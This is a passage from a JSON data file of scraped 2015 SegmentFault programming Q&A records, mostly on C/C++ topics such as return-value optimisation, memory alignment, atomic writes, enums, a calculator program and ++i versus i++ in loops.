      "dsc": "<div class=\"question fmt\" data-id=\"1010000002605052\">\n<p>如题，为什么会这样啊，理论上来说，函数返回了，局部对象会析构吧，如果不生产个临时对象，怎么把对象返回呢。</p>\n<pre><code><br>class Test{\npublic:\n    Test(){cout &lt;&lt; \"Test::Test()\" &lt;&lt; endl;}\n    ~Test(){ cout &lt;&lt; \"Test::~Test()\" &lt;&lt; endl;}\n};\n\nTest func()\n{\n    return Test();\n}\n\nint main()\n{\n    func();\n    return 0;\n}\n</br></code></pre>\n<p>运行结果：</p>\n<pre><code>Test::Test()\nTest::~Test()\n</code></pre>\n<p>这里只产生了一个对象，并没有看到函数返回时的临时对象。</p>\n</div>",
      "favourite": "0",
      "glance": "646",
      "tags": [
        "c++"
      ],
      "time": "2015-03-18",
      "title": "函数返回一个局部对象为什么会没有临时对象产生呢？",
      "url": "https://segmentfault.com/q/1010000002605052"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002639045\">\n<ul>\n<li>C++标准是怎样定义的</li>\n<li>编译器是怎样实现的</li>\n<li>汇编代码是怎样写的</li>\n</ul>\n<p>感觉这些还是需要深入了解一下，希望大牛帮忙解答</p>\n</div>",
      "favourite": "0",
      "glance": "804",
      "tags": [
        "c++",
        "异常"
      ],
      "time": "2015-04-01",
      "title": "Linux中C++的异常处理机制是怎样实现的",
      "url": "https://segmentfault.com/q/1010000002639045"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002659097\">\n<p>你不能“设置”<code>int</code>的字长，这玩意儿本来就不是能设置的东西。<br>\n但大多数C的实现里<code>long</code>的字长等于机器字长，前提是你生成的是“native binary”，比如在64位系统里生成64位的程序。<br>\n另外，pointer/<code>intptr_t</code>/<code>uintptr_t</code>的字长一般也等于机器字长。</br></br></p>\n<p>当然，在51之类的单片机上或者16位的古老系统里完全不是这么回事</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002675449\">\n<p>在不同平台(x86, x64等)和不同的编译器上使用的数据模型是不一样的, 具体可以参考:<br><a href=\"http://en.wikipedia.org/wiki/64-bit_computing#64-bit_data_models\" rel=\"nofollow\">http://en.wikipedia.org/wiki/64-bit_computing#64-bit_data_models</a></br></p>\n<p>另外想拿到和机器字长一样的数据结构的话, 可以用size_t</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002659076\">\n<p>在Linux上用GCC编译，32位机的long是4字节，64位机的long是8字节。</p>\n<p>在VS上搜索了一下宏<code>INT_MAX</code>的定义，貌似只有一处，是<code>2147483647</code>，所以应该没有办法设置了吧，只能自己定义一个类型了。</p>\n<p>而且我了解到通常一些项目都不会直接使用默认类型，而是重新定义一组类型来使用，比如我就可以这样定义一组类型：</p>\n<pre><code>#ifdef m32\ntypedef int SpacelanInt;\ntypedef float SpacelanFloat;\n#else\ntypedef long int SpacelanInt;\ntypedef double SpacelanFloat;\n#endif\n</code></pre>\n</div>",
      "attention": "8",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002658694\">\n<p>比如在处理问题：“如何不使用sizeof()用C程序获得系统字长？”</p>\n<p>即便在64位机上，使用过的C编译器也会将int编译为32位。那么如何在C中设置，使得int编译字长和系统字长相同呢？</p>\n</div>",
      "favourite": "0",
      "glance": "1.2k",
      "tags": [
        "c",
        "c++",
        "程序员",
        "操作系统",
        "windows"
      ],
      "time": "2015-04-08",
      "title": "使用C编译器，如何设置使得int字长与系统字长相同",
      "url": "https://segmentfault.com/q/1010000002658694"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002704625\">\n<pre><code>enum eTaskType{\nTYPE_UNKOWN,\nTYPE_ADD,\n};\n</code></pre>\n<p>or</p>\n<pre><code>typedef enum eTaskType{\nTYPE_UNKOWN,\nTYPE_ADD,\n}TaskType;\n</code></pre>\n<p>假如有上述枚举,或者其他定义方法，如何才能通过枚举变量或枚举类型访问成员(通过. -&gt; ::等方式)，比如：<br>\nTaskType.TYPE_ADD</br></p>\n</div>",
      "favourite": "0",
      "glance": "605",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2015-04-24",
      "title": "C/C++中枚举值的访问方法",
      "url": "https://segmentfault.com/q/1010000002704625"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002708515\">\n<p>问题来源于, 我最早看到好多代码类都用<code>Impl</code>用作后缀<br>\n后来看到这其实来源于<code>&lt;effective c++&gt;</code>中条款31:</br></p>\n<blockquote>\n<p>支持编译依存最小化的一般构想是:相依于声明式,不要相依于定义式,基于此构想的两个手段是Handle classes和Interface classes.</p>\n</blockquote>\n<p>至于<code>Impl</code>一般用于提供类的具体实现,用指针进行封装, 看完了,理解了这种类接口和实现思路, 但是不知所以然.</p>\n<p>具体, 书中问题代码如下, <code>private</code>下包括私有函数都是类的实现细节, 依赖的头文件改变,那么此类必须重编</p>\n<pre><code>#include &lt;string&gt;\n#include \"date.h\"\n#include \"address.h\"\n\nclass Person\n{\npublic:\n    Person(const std::string&amp; name, const Date&amp; birthday, const Address&amp; addr);\n    std::string name() const;\n    std::string birthDate() const;\n    std::string address() const;\nprivate:\n    std::string theName;\n    Date theBirthDate;\n    Address theAddress;\n}\n</code></pre>\n<p>作者给出了这种的实现,如下:</p>\n<pre><code>#include &lt;string&gt;\n#include &lt;memory&gt;\nclass PersonImpl;\nclass Date;\nclass address;\nclass Person\n{\npublic:\n/////////////\nprivate:\n    std::tr1::shared_ptr&lt;PersonImpl&gt; pImpl;\n}\n</code></pre>\n<blockquote>\n<p>这样的设计之下,Person的客户端就完全与Dates, Addresses以及Person的实现细目分离了.那些classes的任何实现修改都不需要Person客户端重新编译.</p>\n</blockquote>\n<p>不太明白, 就算<code>PersonImpl</code>包装了<code>address</code>等实现细节,运行中<code>new</code>了一个<code>PersonImpl</code>对象实现.<br>\n但是编译的时候如果<code>address</code>等类有更改,<code>PersonImpl</code>不也跟着更改了么, 而且<code>Pserson</code>和<code>PersonImpl</code>一般也放在一个cpp里面定义, 不懂哪里节省编译了. 这块有点糊涂. 各位指点一二.</br></p>\n</div>",
      "favourite": "0",
      "glance": "608",
      "tags": [
        "c++"
      ],
      "time": "2015-04-26",
      "title": "为什么用指针完成类实现会将文件间的依存关系降低?",
      "url": "https://segmentfault.com/q/1010000002708515"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002723193\">\n<pre><code>#define POW(c) (1 &lt;&lt; (c))  //2^c\n#define MASK(c) (((unsigned long) -1) / POW(POW(c)) + 1)) //以2^c位为单位分组，相间的全0和全1\n// MASK(0) = 55555555(h) = 01010101010101010101010101010101(b)\n// MASK(1) = 33333333(h) = 00110011001100110011001100110011(b)\n// MASK(2) = 0f0f0f0f(h) = 00001111000011110000111100001111(b)\n// MASK(3) = 00ff00ff(h) = 00000000111111110000000011111111(b)\n// MASK(4) = 0000ffff(h) = 00000000000000001111111111111111(b)\n</code></pre>\n<p>这是“求二进制中数位1的个数”( see: <a href=\"http://www.cnblogs.com/kaikai/archive/2006/02/15/330901.html\" rel=\"nofollow\">http://www.cnblogs.com/kaikai/archive/2006/02/15/330901.html</a>)平行算法中经典的宏定义，POW 、 (unsigned long) -1) 和 算法思想 都可以理解，但是 (((unsigned long) -1) / POW(POW(c)) + 1)) 产生的“以2^c位为单位分组，相间的全0和全1”该如何理解呢？(一个全1的无符号数字除以2的2的幂的幂加1，为什么会产生这样相间的二进制结果呢？)</p>\n<p>找了一些资料都只有对算法的解释没有对这个宏定义的解释，希望大神解答！~</p>\n<p>Thank you!</p>\n</div>",
      "favourite": "0",
      "glance": "721",
      "tags": [
        "算法",
        "分治",
        "二分",
        "数据结构和算法",
        "c++"
      ],
      "time": "2015-05-02",
      "title": "如何理解这段经典的宏定义？",
      "url": "https://segmentfault.com/q/1010000002723193"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002733858\">\n<p>如果你的应用场景是A写文件，B读的话，担心A写到一半B就开始读的话，可以：<br>\n1.A写完了消息通知B再去读。<br>\n2.A先写入一个temp文件，全部写完后将文件改名为B的目标文件。</br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002733889\">\n<p>如果题主说的是 POSIX 里面的 <code>write()</code> 的话，方法是有的，即保证每次写入的数据不超过 <code>PIPE_BUF</code> 就能做到原子性，详见 <code>write()</code> 的<a href=\"http://pubs.opengroup.org/onlinepubs/9699919799//functions/write.html\" rel=\"nofollow\">文档</a>中关于原子性和 <code>O_NONBLOCK</code> 模式下的逻辑说明。</p>\n<blockquote>\n<p>Atomic/non-atomic: A write is atomic if the whole amount written in one operation is not interleaved with data from any other process. ... This volume of POSIX.1-2008 <code>...</code> requires that writes of {PIPE_BUF} or fewer bytes shall be atomic.</p>\n</blockquote>\n<blockquote>\n<p>If the O_NONBLOCK flag is set ... A write request for {PIPE_BUF} or fewer bytes shall have the following effect: if there is sufficient space available in the pipe, write() shall transfer all the data and return the number of bytes requested. Otherwise, write() shall transfer no data and return -1 with errno set to [EAGAIN].</p>\n</blockquote>\n<p><code>PIPE_BUF</code> 是个宏，linux 的话定义在 <code>&lt;linux/limits.h&gt;</code>，其他平台我不太清楚。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002733751\">\n<p>这个要自己写代码实现，可以参考数据库里的事务的实现方式</p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002733660\">\n<p>调用write方法的时候,是否有方法可以保证要不就一个字节都不写入,要不就全部都写入?<br>\n把场景也描述一下,比如有一个文件有10行记录,读取第5行的记录,进行修改,我希望修改的操作是原子性的,也就是说,read的时候,要不是旧的记录,要不就是新的</br></p>\n</div>",
      "favourite": "0",
      "glance": "731",
      "tags": [
        "c++"
      ],
      "time": "2015-05-06",
      "title": "write文件,是否可以在非阻塞的情况下,保证一次write数据的原子性?",
      "url": "https://segmentfault.com/q/1010000002733660"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002776488\">\n<p>题目要求：编写一个程序，显示一个菜单，为您提供加法、减法、乘法或除法的选项，获得您的选择后，该程序请求两个数，然后执行您选择的操作，该程序应该只接受它所提供的菜单选项，它应该使用float类型的数，并且如果用户未能输入数字应允许其重新输入，在除法的情况中，如果用户输入0作为第二个数，该程序应该提示用户输入一个新的值。</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;ctype.h&gt;\nfloat add(float a, float b);\nfloat subtract(float a, float b);\nfloat multiply(float a, float b);\nfloat divide(float a, float b);\nvoid operation_menu(void);\nchar get_first(void);\nint main(void)\n{\n    float num1, num2;\n    int ch;\n    char str[40];\n    printf_s(\"Enter the operation of your choice:\\n\");\n    operation_menu();\n    ch = get_first();\n    while (ch!='q')\n    {\n        switch (ch)\n        {\n        case 'a':\n            printf_s(\"Enter first number:\");\n            while (scanf_s(\"%f\", &amp;num1) != 1)\n            {\n                gets_s(str);\n                printf_s(\"%s is not an number.\\n\", str);\n                printf_s(\"Please enter a number,such as 2.5,-1.78E8,or 3:\");\n            }\n            printf_s(\"Enter second number:\");\n            while (scanf_s(\"%f\", &amp;num2) != 1)\n            {\n                gets_s(str);\n                printf_s(\"%s is not an number.\\n\", str);\n                printf_s(\"Please enter a number,such as 2.5,-1.78E8,or 3:\");\n            }\n            printf_s(\"%.2f+%.2f=%.2f\\n\",num1,num2,add(num1,num2));\n            break;\n        case 's':\n            printf_s(\"Enter first number:\");\n            while (scanf_s(\"%f\", &amp;num1) != 1)\n            {\n                gets_s(str);\n                printf_s(\"%s is not an number.\\n\", str);\n                printf_s(\"Please enter a number,such as 2.5,-1.78E8,or 3:\");\n            }\n            printf_s(\"Enter second number:\");\n            while (scanf_s(\"%f\", &amp;num2) != 1)\n            {\n                gets_s(str);\n                printf_s(\"%s is not an number.\\n\", str);\n                printf_s(\"Please enter a number,such as 2.5,-1.78E8,or 3:\");\n            }\n            printf_s(\"%.2f-%.2f=%.2f\\n\", num1, num2, subtract(num1, num2));\n            break;\n        case 'm':\n            printf_s(\"Enter first number:\");\n            while (scanf_s(\"%f\", &amp;num1) != 1)\n            {\n                gets_s(str);\n                printf_s(\"%s is not an number.\\n\", str);\n                printf_s(\"Please enter a number,such as 2.5,-1.78E8,or 3:\");\n            }\n            printf_s(\"Enter second number:\");\n            while (scanf_s(\"%f\", &amp;num2) != 1)\n            {\n                gets_s(str);\n                printf_s(\"%s is not an number.\\n\", str);\n                printf_s(\"Please enter a number,such as 2.5,-1.78E8,or 3:\");\n            }\n            printf_s(\"%.2f*%.2f=%.2f\\n\", num1, num2, multiply(num1, num2));\n            break;\n        case 'd':\n            printf_s(\"Enter first number:\");\n            while (scanf_s(\"%f\", &amp;num1) != 1)\n            {\n                gets_s(str);\n                printf_s(\"%s is not an number.\\n\", str);\n                printf_s(\"Please enter a number,such as 2.5,-1.78E8,or 3:\");\n            }\n            printf_s(\"Enter second number:\");\n            while (scanf_s(\"%f\", &amp;num2) != 1)\n            {\n                gets_s(str);\n                printf_s(\"%s is not an number.\\n\", str);\n                printf_s(\"Please enter a number,such as 2.5,-1.78E8,or 3:\");\n            }\n            if (num2==0)\n            {\n                printf_s(\"!Please enter another number that does't include 0.\\n\");\n                scanf_s(\"%f\", &amp;num2);\n            }\n            printf_s(\"%.2f/%.2f=%.2f\\n\", num1, num2, divide(num1, num2));\n            break;\n        default:\n            printf_s(\"Please enter the characters of a、s、m、d or q\\n\");\n            ch = get_first();\n            continue;\n        }\n        printf_s(\"Enter the operation of your choice:\\n\");\n        operation_menu();\n        ch = get_first();\n    }\n    printf_s(\"Bye.\\n\");\n    system(\"pause\");\n    return 0;\n}\nchar get_first(void)\n{\n    int ch;\n    ch = getchar();\n    while (isspace(ch))\n    {\n        ch = getchar();\n    }\n    while (getchar()!='\\n')\n    {\n        continue;\n    }\n    return ch;\n}\nvoid operation_menu(void)\n{\n    printf_s(\"a.add               s.subtract\\n\");\n    printf_s(\"m.multiply          d.divide\\n\");\n    printf_s(\"q.quit\\n\");\n}\nfloat add(float a,float b)\n{\n    float add_result;\n    add_result = a + b;\n    return add_result;\n}\nfloat subtract(float a, float b)\n{\n    float sub_result;\n    sub_result = a - b;\n    return sub_result;\n}\nfloat multiply(float a, float b)\n{\n    float mult_result;\n    mult_result = a*b;\n    return mult_result;\n}\nfloat divide(float a, float b)\n{\n    float div_result;\n    div_result = a / b;\n    return div_result;\n}\n</code></pre>\n<p>程序执行可以，请问是否可以修改程序使其更加简洁，但需要完成所有内容，并且更加用户友好。谢谢，欢迎大家讨论<br>\n2015/5/20<br>\n今日探索，代码正式修改为下面，欢迎指正</br></br></p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;ctype.h&gt;\nvoid operation_menu();\nchar get_first();\nfloat get_float();\nchar get_choice();\nint main(void)\n{\n    float num1, num2;\n    char ch;\n    printf_s(\"Enter the operation of your choice:\\n\");\n    operation_menu();\n    while ((ch=get_choice())!='q')\n    {\n        printf_s(\"Enter first number:\");\n        num1 = get_float();\n        printf_s(\"Enter second number:\");\n        num2 = get_float();\n        while (ch == 'd'&amp;&amp;num2 == 0)\n        {\n            printf_s(\"!Please enter another number that does't include 0.\\n\");\n            num2 = get_float();\n        }\n        switch (ch)\n        {\n        case 'a':\n            printf_s(\"%.2f+%.2f=%.2f\\n\", num1, num2, (num1 + num2));\n            break;\n        case 's':\n            printf_s(\"%.2f-%.2f=%.2f\\n\", num1, num2, (num1 - num2));\n            break;\n        case 'm':\n            printf_s(\"%.2f*%.2f=%.2f\\n\", num1, num2, (num1*num2));\n            break;\n        case 'd':\n            printf_s(\"%.2f/%.2f=%.2f\\n\", num1, num2, (num1 / num2));\n            break;\n        default:\n            break;\n        }\n        printf_s(\"Enter the operation of your choice:\\n\");\n        operation_menu();\n    }\n    printf_s(\"Bye.\\n\");\n    system(\"pause\");\n    return 0;\n}\n//获取第一个字符\nchar get_first()\n{\n    int ch;\n    ch = getchar();\n    while (isspace(ch))\n    {\n        ch = getchar();\n    }\n    while (getchar()!='\\n')\n    {\n        continue;\n    }\n    return ch;\n}\n//打印菜单选项\nvoid operation_menu()\n{\n    printf_s(\"a.add               s.subtract\\n\");\n    printf_s(\"m.multiply          d.divide\\n\");\n    printf_s(\"q.quit\\n\");\n}\n//获取数字\nfloat get_float()\n{\n    float num;\n    char str[40];\n    while (scanf_s(\"%f\",&amp;num)!=1)\n    {\n        gets_s(str);\n        printf_s(\"%s is not a number.\\n\",str);\n        printf_s(\"Please enter a number,such as 2.5,-1.78E8,or 3:\");\n    }\n    while (getchar()!='\\n')\n    {\n        ;\n    }\n    return num;\n}\n//选择函数\nchar get_choice()\n{\n    char choice;\n    choice = get_first();\n    while (choice!='a'&amp;&amp;choice!='s'&amp;&amp;choice!='m'&amp;&amp;choice!='d'&amp;&amp;choice!='q')\n    {\n        printf_s(\"Please response with a,s,m,d or q.\\n\");\n        choice = get_first();\n    }\n    return choice;\n}\n</code></pre>\n</div>",
      "favourite": "0",
      "glance": "541",
      "tags": [
        "c++"
      ],
      "time": "2015-05-18",
      "title": "计算器程序完善修改优化",
      "url": "https://segmentfault.com/q/1010000002776488"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002913131\">\n<blockquote>\n<p><code>a = b ?: c</code> 是 <code>a = b ? b : c</code> 的简写。</p>\n</blockquote>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002912761\">\n<pre><code>b = true\nc = false\na = b ?: c  // a = true\n\nb = false\nc = true\na = b ?: c // a = true\n</code></pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002913115\">\n<p>帮你搜索了一下，见<a href=\"http://stackoverflow.com/questions/8760561/is-this-ternary-conditional-correct-objective-c-syntax\" rel=\"nofollow\">StackOverflow</a></p>\n</div>",
      "attention": "9",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002912729\">\n<p><strong>注意：我很清楚   a = b ? c : d 是什么意思，可这不是我要问的问题。</strong></p>\n<p>三元运算符 a = b ?: c 是什么意思。注意， ?和: 是在一起的</p>\n</div>",
      "favourite": "0",
      "glance": "875",
      "tags": [
        "c",
        "c++",
        "objective-c"
      ],
      "time": "2015-06-17",
      "title": "三元运算符 a = b ?: c 是什么意思",
      "url": "https://segmentfault.com/q/1010000002912729"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002954163\">\n<p>CHrome自45版本以后已经不再支持npapi了，请问有什么别的方式实现网页跟客户端交互，并把参数传递给客户端呢？</p>\n</div>",
      "favourite": "0",
      "glance": "1.5k",
      "tags": [
        "c++"
      ],
      "time": "2015-07-02",
      "title": "Chrome45不再支持npapi了，请问有什么别的方式实现网页跟客户端交互呢？",
      "url": "https://segmentfault.com/q/1010000002954163"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002963205\">\n<p>请参考一下这个<a href=\"http://segmentfault.com/q/1010000002922477/a-1020000002924594\" rel=\"nofollow\">C/C++如何发送包含包体长度和结构体的socket包</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002971099\">\n<p>为什么要涉及到内存对齐呐？如果你想知道某个类型占用内存的大小，最好就用sizeof.关于内存对齐，不同的平台对齐模数不一样，内存布局也就不一样。不过有个 #pragma pack(对齐模数）预处理指令，可以用来控制。修改了对齐模数，可能会影响CPU读取内存的速度。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002973635\">\n<p>根本不用考虑这个问题吧？只要你的算法能兼容不同的对齐策略就可以了。至于不同平台之间的差异，设计网络通讯协议需要考虑，而像内存池这种本地代码的话根本不必考虑，因为不可能在这台机器上申请内存给另一台机器用啊。</p>\n</div>",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002963164\">\n<p>想实现一个跨平台的HEAP或者内存池之类的东西，分配的内存大小是不固定的。<br>\n在win32下，HeapAlloc返回的地址总是8的整数倍；在win64下，HeapAlloc返回的地址总是16的整数倍。这个究竟是不是全平台通用的规则还是特例？<br>\nLua源代码里，通过共同体“L_Umaxalign”来实现数据对齐，但是这个最多保证8字节对齐。我想在L_Umaxalign里加入long double实现16字节对齐，但是VC下long double还是8字节的，且在有些编译器下long double是12字节。仍然做不到16字节对齐。<br>\n查了一下，貌似win64下heap数据16字节对齐是为某些SSE指令，如果不考虑这个问题，64位平台下8字节对齐是不是也没关系？</br></br></br></p>\n</div>",
      "favourite": "0",
      "glance": "1k",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2015-07-06",
      "title": "跨平台时如何保证字节对齐",
      "url": "https://segmentfault.com/q/1010000002963164"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002993835\">\n<p>所以不能招C++工程师，只能招Cpp工程师或者C语言工程师，哈哈哈哈哈哈哈。</p>\n</div>",
      "favourite": "0",
      "glance": "426",
      "tags": [
        "招聘",
        "c++"
      ],
      "time": "2015-07-16",
      "title": "招聘标题不能输“+”号",
      "url": "https://segmentfault.com/q/1010000002993835"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003009538\">\n<p>C语言看看goahead吧。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003011764\">\n<p>Tornado和Flask读一下都非常不错。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003011839\">\n<p>推荐读nginx 读完你会感觉自己变了一个人</p>\n</div>",
      "attention": "13",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003004653\">\n<p>比如nginx、tornado这种？</p>\n<p>我觉得nginx会不会比较复杂，有没有上手简单一点的？</p>\n</div>",
      "favourite": "5",
      "glance": "1.4k",
      "tags": [
        "c",
        "c++",
        "python",
        "server"
      ],
      "time": "2015-07-20",
      "title": "c/c++/python有什么值得阅读的web服务器代码",
      "url": "https://segmentfault.com/q/1010000003004653"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003043071\">\n<p>我们用Thrift</p>\n<p><a href=\"http://thrift.apache.org/\" rel=\"nofollow\">http://thrift.apache.org/</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003043002\">\n<p>基本都是各个模块做成服务的形式，然后相互调用。不会涉及到语言层面。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003044040\">\n<p>现在的后台架构都不限于用某种语言，分布式、大数据处理基本上是java,较好的http服务器如Nginx用c编写，能处理并发请求数比其他的引擎都多，缓存系统可以选用memcache、Redis等，他们都是用c编写的，至于各个模块的交互都是通过协议通信，所以不会存在语言的界限。一般来说php不会配合Java使用。做网站后台的话起码要会java,php,C#其中一种语言。不知道你问的是前端还是后台，以上说的都是后台。前端就比较通用了，html,js,css都要。</p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003042988\">\n<p>大型网站，PHP一般与Java配合使用，还是和c/c++配合使用？</p>\n</div>",
      "favourite": "0",
      "glance": "825",
      "tags": [
        "c++",
        "java",
        "c"
      ],
      "time": "2015-08-02",
      "title": "Java or c/c++ 与PHP配合使用",
      "url": "https://segmentfault.com/q/1010000003042988"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003021450\">\n<p>这个问题问的好，接下来我们一起疤丁解牛,把简单的事情说复杂看看是什么样子</p>\n<p>先剖析下for的执行顺序，<br><code>for(A;B;C){D}</code><br>\n1. 进入循执<br>\n2. 首先是根据A，初始化，<br>\n3. 判断B,是否满足，如果满足进入D<br>\n4. 循环结束后，执行C,<br>\n5. 执行C后跳转到3 ，继续3-4-5-3-4-5的循环 直到满足C不满足。</br></br></br></br></br></br></p>\n<p>实际上程序执行过程是<code>A-(B-D-C)-(B-D-C)-(B-D-C)...-B</code> 的过程。</p>\n<p>你感官觉得结果应该不同的，但输出为什么都一样呢，在看i++和++i</p>\n<p>先看这句</p>\n<pre><code>a++;\n</code></pre>\n<p>其实就是等价于下面2句</p>\n<pre><code>a=a（这就就是废话）\na=a+1（结果a增加了1）\n</code></pre>\n<p>然后看这句</p>\n<pre><code>++b;\n</code></pre>\n<p>其实就是等价于下面</p>\n<pre><code>b=b+1;（b增加1）\nb=b;（b还是那个增加了1的b）\n</code></pre>\n<p>可见执行完后都是plus1了，<br>\n因此这种差别只有在有赋值的情况，如下：<br>\nj=i++（等价于j=i;i=i+1）<br>\nj=++i (等价于i=i+1;j=i)也即(j=i+1)</br></br></br></p>\n<p>因此对J才有区别，对i都是加了1的。<br>\n因此你的循环的结果相同的就好容易理解了吧。<br>\n那么，尽管我说了这么多，可能人的自觉感觉结果应该不同的才感觉合理啊，如果要出现你感官上那种不同，改为以下即可。</br></br></p>\n<pre><code>i=0;\nj=0\nfor (var j = 0; j &lt; 10; j) {\n        console.log(\"循环\"+j);\nj=i++;\n    }\n   console.log(\"循环后i等于\"+i)\n   console.log(\"循环后j等于\"+j)\n\n</code></pre>\n<hr>\n<pre><code>i=0\nj=0\nfor (var j = 0; j &lt; 10; j) {\n        console.log(\"循环\"+j);\nj=++i;\n    }\n   console.log(\"循环后i等于\"+i)\n   console.log(\"循环后j等于\"+j)\n</code></pre>\n<p><img data-src=\"/img/bVmQaQ\"/></p>\n<h1>废话这么多，就是一句话，没有赋值的时候，i++和++i都是让i加1，是等价的。</h1>\n</hr></div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003022922\">\n<p>如果非要纠结那一点效率的话++i的效率要高于i++那么一丢丢(未编译的情况下)<br>\n原因上面也有人提到，i++会使用当前值后在+1，这时会有一个临时变量的出现存储+1后的值。而++i则直接进行+1，不会出现临时变量。所以......</br></p>\n<p>我只是从效率上考虑而已。其他的一些推荐写法看个人爱好。不过效率真心影响不大。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003021372\">\n<p>要知道for循环的三个表达式相当于三段式的while。 第三个表达式是在每次循环结束后执行，所以无论是先加还是后加，在语句结束后都已经自增完了。</p>\n<p>通常使用先加要优于后加，因为通常意义来讲，后加是会产生一个临时变量。但对于c++等编译语言，后加是会被优化的。至于在PHP具体怎么优化，不是很了解。</p>\n<p>使用前加是一个很好的编程习惯。</p>\n</div>",
      "attention": "30",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003021258\">\n<p>补充3：<br>\n谢谢大家的热情回答～！<br>\n通过<code>md5ryan</code>与<code>2bdenny</code>l两位以及<code>之前多位</code>的回答，已经可以给在C中这两者的效率问题盖棺定论了。<br>\n在早些时候应该是前置递增比较的有效率，而在<code>现代</code>两者已经<code>没有区别</code>了。<br>\n不过LZ其实想问的是在<code>JS</code>中这两者的效率有米差别囧。。。。。。</br></br></br></br></p>\n<p>在C中可以通过查看其汇编后的代码来分析两者有没有差别，不过在像JS这种解释性语言要怎么分析这种类型的问题呢？？<br>\n想了想大致可以分为两种方法吧：<br>\n1、实验法，就是分别写一段代码，测试时间<br>\n2、分析其引擎实现，像JS的话就是指的是V8</br></br></br></p>\n<p>第一种方法简单易实现，不过还是从表面观察，有种雾里看花的感觉<br>\n第二种方法很难，因为这是要去掌握规则，不过一旦掌握了，按照一般奇幻小说里的等级构架那就是传奇法师级别的了吧～～</br></p>\n<p>我辈的追求大概就是不断的去寻求真理吧！<br>\n所以<code>问题更新</code>了～<br>\n在<code>V8</code>环境下，++i与i++ 的具体实现过程</br></br></p>\n<p>LZ能力有限，在这提供给大家V8在GitHub上的源码镜像<a href=\"https://github.com/v8/v8\" rel=\"nofollow\">https://github.com/v8/v8</a></p>\n<p><code>原问题</code>：<br>\nfor (var i = 0; i &lt; N ; ++i)中 ++i 而不是 i++ ，是不是只是习惯的上的区别？？</br></p>\n<hr>\n<p>补充2：<br>\n首先！<br>\n我真的<code>不是</code>在问前置递增与后置递增的区别！！，汗。<br>\n注意下上下文，是在<code>for这表达式</code>中这两者有没有区别！！！<br>\n比如<code>效率</code>上两者有没有差距，等</br></br></br></br></p>\n<hr>\n<p>明白i++与++i的区别，但在for循环应用中有点迷惑。</p>\n<pre><code><br>    for (var i = 0; i &lt; 10; i++) {\n        print(i);\n    }\n\n\n    for (var i = 0; i &lt; 10; ++i) {\n        print(i);\n    }\n\n\n</br></code></pre>\n<p>输出的都一样：0~9</p>\n<hr>\n<p>补充1：<br>\n额，好像大家有点理解错我的意思了。。。<br>\n被踩那么多，好郁闷啊。。。。<br>\n今天看书的时候，看到作者是这样写的</br></br></br></p>\n<pre><code>for (var i = 0; i &lt; this.dataStore.length; ++i)\n</code></pre>\n<p>但平时自己习惯是写<code>i++</code>的，后来查了下书，这应该等价于</p>\n<pre><code>var i = 0\nwhile (i &lt; this.dataStore.length){\n    code\n    ++i\n}\n</code></pre>\n<p>和</p>\n<pre><code>var i = 0\nwhile (i &lt; this.dataStore.length){\n    code\n    i++\n}\n</code></pre>\n<p>这样不管是先运算i,还是后运算i的值，最后都是一样的吧。因为已经不会影响到code里的代码了。<br>\n所以这样<code>for (var i = 0; i &lt; this.dataStore.length; ++i)</code>中 <code>++i</code> 